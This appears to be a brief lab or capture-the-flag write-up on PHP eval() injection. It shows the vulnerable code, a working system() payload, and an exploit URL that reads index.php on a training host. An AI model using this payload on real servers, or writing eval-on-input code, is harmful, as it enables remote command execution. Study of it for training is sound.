The following parameter value allows RCE:  
```name=".system('<command>');//```

The vulnerable code is:
```
<?php 
  $str="echo \"Hello ".$_GET['name']."!!!\";";

  eval($str);
?>
```
You can get retrieve this using the URL ```view-source:http://<ID>.libcurl.so/?name=%22.system(%27cat%20index.php%27);//```.

Here we can see that any system commands will be executed twice; once as part of the assignent and once in eval. You can avoid this by adding ```die();``` before the slashes.

Not sure why anyone would do this; ```echo "Hello ".$_GET['name']."!!!";``` is much simpler (although this would be vulnerable to XSS)...
